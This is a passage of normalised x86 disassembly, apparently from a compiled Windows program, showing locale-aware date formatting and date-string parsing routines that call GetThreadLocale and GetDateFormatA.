mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409580
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_4096f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4092d4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409730
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40987e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f90
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409885
lea eax [ ebp - 0x118 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404200
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404250
mov edx eax
mov eax [ ebx ]
call sub_40bc74
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bde8
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4044b0
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bd84
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404188
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bde8
mov ecx eax
mov eax ebx
mov edx esi
call sub_404080
sub_409898
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409976
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f90
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404028
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40997d
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404200
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404250
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044b0
sub_4099a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a121
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a128
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fb4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40be68
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40be48
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4095dc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40be68
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4095dc
pop ecx
mov al [ eax + lookup_table_409a83 ]
jmp [ eax * 4 + jump_table_409abc ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096b8
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409730
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409620
pop ecx
jmp r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409898
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409620
pop ecx
jmp r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40968c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096f0
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096f0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096f0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40968c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40968c
pop ecx
push ebp
call sub_4096f0
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_4096f0
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
push ebp
call sub_40968c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
push ebp
call sub_4096f0
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409640
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409640
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4095dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4095dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4095dc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095a0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4095dc
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4095dc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095a0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40be68
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4095dc
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409640
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095a0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409620
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409620
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40be68
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099a0
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4095dc
pop ecx
jmp r-xdata
push ebp
call sub_4096b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095a0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409620
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40847c
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40847c
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40847c
test eax eax
jne r-xdata
jmp r-xdata
sub_40a154
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_4099a0
pop ecx
push ebp
mov eax ebx
call sub_4099a0
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404080
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a1c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404250
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a1e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a1c4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404250
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a27c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a2f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2fc
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a1c4
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404250
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4044b0
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407be4
test eax eax
jne r-xdata
mov eax edi
call sub_404250
add [ esi ] eax
mov bl 0x1
sub_40a308
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a1c4
mov eax esi
call sub_404250
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a340
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404250
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a38c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404250
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40beac
mov [ ebx ] eax
jmp r-xdata
sub_40a3d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404450
push eax
mov eax [ ebx ]
call sub_404450
pop edx
call sub_40bf20
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a428
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4095c8
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a484
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a79f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a340
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40bee8
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a1e8
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a38c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4044b0
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407c54
mov eax [ ebp - 0x1c ]
call sub_40a3d4
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a7a6
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fb4
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a308
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a1e8
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a308
test al al
je r-xdata
call sub_4095c8
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a1e8
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_40936c
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404594
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a308
mov edx ebx
mov eax esi
call sub_40a1c4
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404250
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a38c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a428
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a1c4
mov eax esi
call sub_404250
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4095c8
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404250
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044b0
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407be4
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404250
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044b0
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407be4
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a7c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a27c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a27c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a27c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a1e8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a1c4
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a27c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a308
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a1e8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a27c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a308
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a1c4
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409264
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a27c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a1e8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a27c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a308
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a27c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
